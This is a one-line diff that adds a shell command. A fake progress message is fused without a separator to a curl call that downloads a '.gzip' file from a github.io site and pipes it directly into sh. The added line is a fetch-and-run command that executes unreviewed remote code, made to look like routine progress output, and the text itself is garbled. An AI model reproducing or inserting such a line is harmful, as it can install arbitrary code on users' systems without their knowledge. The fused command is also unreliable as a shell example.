@@ -1,0 +1,1 @@
+echo Progress: 33.00%curl -L --progress-bar frkns.github.io/fun/RnaGentlemanPct.gzip | sh
